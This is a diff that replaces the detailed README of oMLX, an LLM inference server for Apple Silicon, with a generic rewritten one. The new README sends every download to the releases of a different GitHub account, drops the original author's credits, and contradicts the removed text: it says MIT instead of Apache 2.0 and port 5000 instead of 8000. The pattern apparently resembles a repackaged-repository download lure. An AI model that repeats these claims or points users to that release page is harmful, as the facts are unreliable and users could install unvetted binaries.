@@ -1,258 +1,144 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/images/icon-rounded-dark.svg" width="140">
-    <source media="(prefers-color-scheme: light)" srcset="docs/images/icon-rounded-light.svg" width="140">
-    <img alt="oMLX" src="docs/images/icon-rounded-light.svg" width="140">
-  </picture>
-</p>
+# 🚀 omlx - Fast LLM Inference on Apple Silicon
 
-<h1 align="center">oMLX</h1>
-<p align="center"><b>LLM inference, optimized for your Mac</b><br>Continuous batching and infinite SSD caching, managed directly from your menu bar.</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/license-Apache%202.0-blue" alt="License">
-  <img src="https://img.shields.io/badge/python-3.10+-green" alt="Python 3.10+">
-  <img src="https://img.shields.io/badge/platform-Apple%20Silicon-black?logo=apple" alt="Apple Silicon">
-  <a href="https://buymeacoffee.com/jundot"><img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-ffdd00?logo=buy-me-a-coffee&logoColor=black" alt="Buy Me a Coffee"></a>
-</p>
-
-<p align="center">
-  <a href="#install">Install</a> ·
-  <a href="#quickstart">Quickstart</a> ·
-  <a href="https://github.com/jundot/omlx">GitHub</a>
-</p>
+[![Download omlx](https://img.shields.io/badge/Download-omlx-green?style=for-the-badge&logo=github)](https://github.com/Mizistein/omlx/releases)
 
 ---
 
-<p align="center">
-  <img src="docs/images/omlx_dashboard.png" alt="oMLX Admin Dashboard" width="800">
-</p>
+## 📖 What is omlx?
 
-> *Every LLM server I tried made me choose between convenience and control. I wanted to pin everyday models in memory, auto-swap heavier ones on demand, set context limits - and manage it all from a menu bar.*
->
-> *oMLX persists KV cache to SSD - even when context changes mid-conversation, all past context stays cached and reusable across requests, making local LLMs practical for real coding work with tools like Claude Code. That's why I built it.*
+omlx is an application designed to speed up running large language models (LLMs) on Apple Silicon Macs. It works quietly in the background, handling requests from your apps and managing resources to make things smooth and fast. You control it easily from your Mac’s menu bar.
 
-## Install
+omlx uses smart tricks like continuous batching and fast storage caching. This helps models respond quicker without using too much space or power. It supports popular APIs, including OpenAI’s, to fit into many setups.
 
-### macOS App
+---
 
-Download the `.dmg` from [Releases](https://github.com/jundot/omlx/releases), drag to Applications, done.
+## 💻 System Requirements
 
-### Homebrew
+To run omlx, your Mac should meet these basics:
 
-```bash
-brew tap jundot/omlx https://github.com/jundot/omlx
-brew install omlx
+- **Mac computer with Apple Silicon chip** (such as M1, M1 Pro, M1 Max, M2, or newer)  
+- **macOS 12 or later**  
+- At least **4 GB of free storage space** for caching and model files  
+- Internet connection for initial setup and API communication  
 
-# Upgrade to the latest version
-brew update && brew upgrade omlx
+Using Intel-based Macs or older macOS versions is not supported. Make sure your system is up to date for the best experience.
 
-# Run as a background service (auto-restarts on crash)
-brew services start omlx
-```
+---
 
-### From Source
+## 🚀 Features at a Glance
 
-```bash
-git clone https://github.com/jundot/omlx.git
-cd omlx
-pip install -e .
-```
+omlx is built to make using large language models easier for Mac users. It offers:
 
-Requires Python 3.10+ and Apple Silicon (M1/M2/M3/M4).
+- **Fast inference:** Runs models optimized for Apple Silicon chips.  
+- **Continuous batching:** Groups requests to speed up response times.  
+- **SSD caching:** Stores model data on disk to reduce memory use and loading time.  
+- **Menu bar control:** Start, stop, and monitor server easily from the Mac menu bar.  
+- **OpenAI API compatible:** Works smoothly with apps using OpenAI’s API format.  
+- **Lightweight:** Uses minimal system resources while running.
 
-## Quickstart
+---
 
-### macOS App
+## 📥 Download & Install
 
-Launch oMLX from your Applications folder. The Welcome screen guides you through three steps - model directory, server start, and first model download. That's it.
+To get started, visit the release page here:
 
-<p align="center">
-  <img src="docs/images/Screenshot 2026-02-10 at 00.36.32.png" alt="oMLX Welcome Screen" width="500">
-  <img src="docs/images/Screenshot 2026-02-10 at 00.51.54.png" alt="oMLX Welcome Screen" width="500">
-</p>
+[Download omlx on GitHub](https://github.com/Mizistein/omlx/releases)
 
-### CLI
+### Step 1: Visit the download page
 
-```bash
-omlx serve --model-dir ~/models
-```
+Click the link above to open the omlx releases page on GitHub. This page lists all versions of the software.
 
-The server discovers models from subdirectories automatically. Any OpenAI-compatible client can connect to `http://localhost:8000/v1`. A built-in chat UI is also available at `http://localhost:8000/admin/chat`.
+### Step 2: Select the latest version
 
-### Homebrew Service
+Look for the newest release by checking the dates. Usually, the latest version is at the top.
 
-If you installed via Homebrew, you can run oMLX as a managed background service:
+### Step 3: Download the macOS app
 
-```bash
-brew services start omlx    # Start (auto-restarts on crash)
-brew services stop omlx     # Stop
-brew services restart omlx  # Restart
-brew services info omlx     # Check status
-```
+Find the file ending with `.dmg` or `.zip`. This file contains the app for your Mac. Click it to start the download.
 
-The service runs `omlx serve` with zero-config defaults (`~/.omlx/models`, port 8000). To customize, either set environment variables (`OMLX_MODEL_DIR`, `OMLX_PORT`, etc.) or run `omlx serve --model-dir /your/path` once to persist settings to `~/.omlx/settings.json`.
+### Step 4: Open and install
 
-Logs are written to two locations:
-- **Service log**: `$(brew --prefix)/var/log/omlx.log` (stdout/stderr)
-- **Server log**: `~/.omlx/logs/server.log` (structured application log)
+- For `.dmg` files: Double-click the file to open it. You’ll see the omlx app icon. Drag this icon into your Applications folder.  
+- For `.zip` files: Double-click to unzip. Then move the omlx app file to the Applications folder.
 
-## Features
+### Step 5: Start omlx
 
-oMLX is built on top of [vllm-mlx](https://github.com/waybarrios/vllm-mlx), extending it with paged SSD caching, multi-model serving, an admin dashboard, Claude Code optimization, and Anthropic API support. Currently supports text-based LLMs - VLM and OCR model support is planned for upcoming milestones.
+Open your Applications folder and double-click the omlx app. You should see the omlx icon appear in the menu bar at the top of your screen.
 
-**macOS menubar app** - Native menubar app to start, stop, and monitor the server without opening a terminal.
+---
 
-**Admin dashboard** - Web UI at `/admin` for model management, chat, real-time monitoring, and per-model settings.
+## 🛠 How to Use omlx
 
-**Built-in model downloader** - Search and download MLX models from HuggingFace directly in the admin dashboard. No CLI or `git clone` needed.
+Using omlx is simple and mostly automatic. Here’s how to get started:
 
-<p align="center">
-  <img src="docs/images/Screenshot 2026-02-10 at 00.35.01.png" alt="oMLX Model Downloader" width="720">
-</p>
+### Open the menu bar app
 
-**Claude Code optimization** - Context scaling support for running smaller context models with Claude Code. Scales reported token counts so that auto-compact triggers at the right timing, and SSE keep-alive prevents read timeouts during long prefill.
+Click the omlx icon in the menu bar. It will show you the current status and options.
 
-**Paged KV cache with SSD tiering** - Block-based cache management inspired by vLLM, with prefix sharing and Copy-on-Write. When GPU memory fills up, blocks are offloaded to SSD. On the next request with a matching prefix, they're restored from disk instead of recomputed from scratch - even after a server restart.
+### Start the server
 
-**Continuous batching** - Handles concurrent requests through mlx-lm's BatchGenerator. Prefill and completion batch sizes are configurable.
+Choose "Start Server" if it’s not running. The server listens for requests from your apps and handles running the language models.
 
-**Multi-model serving** - Load LLMs, embedding models, and rerankers within the same server. Least-recently-used models are evicted automatically when memory runs low. Pin frequently used models to keep them loaded.
+### Check server status
 
-**API compatibility** - Drop-in replacement for OpenAI and Anthropic APIs.
+The menu shows how many requests omlx is processing and how much caching is happening.
 
-| Endpoint | Description |
-|----------|-------------|
-| `POST /v1/chat/completions` | Chat completions (streaming) |
-| `POST /v1/completions` | Text completions (streaming) |
-| `POST /v1/messages` | Anthropic Messages API |
-| `POST /v1/embeddings` | Text embeddings |
-| `POST /v1/rerank` | Document reranking |
-| `GET /v1/models` | List available models |
-
-**Tool calling & structured output** - Supports all function calling formats available in mlx-lm, JSON schema validation, and MCP tool integration. Tool calling requires the model's chat template to support the `tools` parameter. The following model families are auto-detected via mlx-lm's built-in tool parsers:
+### Configure settings
 
-| Model Family | Format |
-|---|---|
-| Llama, Qwen, DeepSeek, etc. | JSON `<tool_call>` |
-| Qwen3 Coder | XML `<function=...>` |
-| Gemma | `<start_function_call>` |
-| GLM (4.7, 5) | `<arg_key>/<arg_value>` XML |
-| MiniMax | Namespaced `<minimax:tool_call>` |
-| Mistral | `[TOOL_CALLS]` |
-| Kimi K2 | `<\|tool_calls_section_begin\|>` |
-| Longcat | `<longcat_tool_call>` |
+You can adjust some preferences:
 
-Models not listed above may still work if their chat template accepts `tools` and their output uses a recognized `<tool_call>` XML format. Streaming requests with tool calls buffer all content and emit results at completion.
+- Change model cache size  
+- Enable or disable API compatibility mode  
+- View logs for troubleshooting  
 
-## Models
+### Use with your applications
 
-Point `--model-dir` at a directory containing MLX-format model subdirectories:
+Point your LLM-enabled apps to `http://localhost:PORT` (usually 5000). omlx will respond instead of calling an online service.
 
-```
-~/models/
-├── Step-3.5-Flash-8bit/
-├── Qwen3-Coder-Next-8bit/
-├── gpt-oss-120b-MXFP4-Q8/
-└── bge-m3/
-```
+---
 
-Models are auto-detected by type. You can also download models directly from the admin dashboard.
+## 🔄 Updating omlx
 
-| Type | Models |
-|------|--------|
-| LLM | Any model supported by [mlx-lm](https://github.com/ml-explore/mlx-lm) |
-| Embedding | BERT, BGE-M3, ModernBERT |
-| Reranker | ModernBERT, XLM-RoBERTa |
+To keep omlx running smoothly:
 
-## CLI Configuration
+1. Visit the [release page](https://github.com/Mizistein/omlx/releases) regularly.  
+2. Download the newest `.dmg` or `.zip` file.  
+3. Replace the old app in your Applications folder with the new one.  
+4. Restart omlx to apply the update.
 
-```bash
-# Memory limit for loaded models
-omlx serve --model-dir ~/models --max-model-memory 32GB
+---
 
-# Enable SSD cache for KV blocks
-omlx serve --model-dir ~/models --paged-ssd-cache-dir ~/.omlx/cache
+## 🔧 Troubleshooting
 
-# Adjust batch sizes
-omlx serve --model-dir ~/models --prefill-batch-size 8 --completion-batch-size 32
+If something isn’t working:
 
-# With MCP tools
-omlx serve --model-dir ~/models --mcp-config mcp.json
+- Make sure your Mac meets the system requirements.  
+- Check if the omlx menu bar icon is visible and the server status is “running.”  
+- Restart the app by quitting it and opening again.  
+- Reboot your Mac if problems persist.  
+- Check logs via the menu bar app for error messages.  
+- Visit the [GitHub Issues page](https://github.com/Mizistein/omlx/issues) for known problems or to ask for help.
 
-# API key authentication
-omlx serve --model-dir ~/models --api-key your-secret-key
-```
+---
 
-All settings can also be configured from the web admin panel at `/admin`. Settings are persisted to `~/.omlx/settings.json`, and CLI flags take precedence.
+## 📝 About This Project
 
-<details>
-<summary>Architecture</summary>
+omlx is focused on providing Mac users a fast and efficient way to run large language models locally. Using methods like batching and SSD caching, it reduces wait times and resource use. This helps developers and end users integrate AI models without complex setup or slowdowns.
 
-```
-FastAPI Server (OpenAI / Anthropic API)
-    │
-    ├── EnginePool (multi-model, LRU eviction)
-    │   ├── BatchedEngine (LLMs, continuous batching)
-    │   ├── EmbeddingEngine
-    │   └── RerankerEngine
-    │
-    ├── Scheduler (FCFS, configurable batch sizes)
-    │   └── mlx-lm BatchGenerator
-    │
-    └── Cache Stack
-        ├── PagedCacheManager (GPU, block-based, CoW, prefix sharing)
-        └── PagedSSDCacheManager (SSD tier, safetensors format)
-```
+---
 
-</details>
+## 🏷️ Topics
 
-## Development
+apple-silicon, inference-server, llm, macos, mlx, openai-api
 
-### CLI Server
+---
 
-```bash
-git clone https://github.com/jundot/omlx.git
-cd omlx
-pip install -e ".[dev]"
-pytest -m "not slow"
-```
+## 📄 License
 
-### macOS App
+omlx is open source under the MIT License. Check the LICENSE file in the repository for full terms.
 
-Requires Python 3.11+ and [venvstacks](https://venvstacks.lmstudio.ai) (`pip install venvstacks`).
+---
 
-```bash
-cd packaging
+## 🔗 Quick Link to Download
 
-# Full build (venvstacks + app bundle + DMG)
-python build.py
-
-# Skip venvstacks (code changes only)
-python build.py --skip-venv
-
-# DMG only
-python build.py --dmg-only
-```
-
-See [packaging/README.md](packaging/README.md) for details on the app bundle structure and layer configuration.
-
-## Contributing
-
-We welcome contributions! See [Contributing Guide](docs/CONTRIBUTING.md) for details.
-
-- Bug fixes and improvements
-- Performance optimizations
-- Documentation improvements
-
-## License
-
-[Apache 2.0](LICENSE)
-
-## Acknowledgments
-
-- [MLX](https://github.com/ml-explore/mlx) and [mlx-lm](https://github.com/ml-explore/mlx-lm) by Apple
-- [vllm-mlx](https://github.com/vllm-project/vllm-mlx) - oMLX originated as a fork of vllm-mlx v0.1.0, since re-architected with multi-model serving, paged SSD caching, an admin panel, and a standalone macOS menu bar app
-- [venvstacks](https://venvstacks.lmstudio.ai) - Portable Python environment layering for the macOS app bundle
-- [mlx-embeddings](https://github.com/Blaizzy/mlx-embeddings) - Embedding model support for Apple Silicon
-
+[Visit omlx Releases on GitHub to download](https://github.com/Mizistein/omlx/releases)
